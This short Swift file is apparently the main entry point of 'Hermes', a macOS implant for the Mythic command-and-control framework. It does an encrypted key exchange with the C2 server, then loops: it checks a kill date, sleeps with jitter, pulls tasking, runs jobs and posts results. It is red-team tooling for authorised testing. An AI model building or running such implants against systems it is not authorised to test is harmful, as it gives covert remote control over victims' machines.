//
//  main.swift
//  Hermes
//
//  Created by slyd0g on 5/18/21.
//

import Foundation

// Perform key exchange to grab new AES key from Mythic per implant
if (!encryptedKeyExchange())
{
    exit(0)
}

// Begin main program execution: check kill date, sleep, get tasking from Mythic, execute tasking from Mythic, post tasking to Mythic
var jobs = JobList()
while(true)
{
    checkKillDate()
    sleepWithJitter()
    do {
        try getTasking(jobList: jobs)
        executeJob(jobList: jobs)
        postResponse(jobList: jobs)
    }
    catch {
    }
    
}

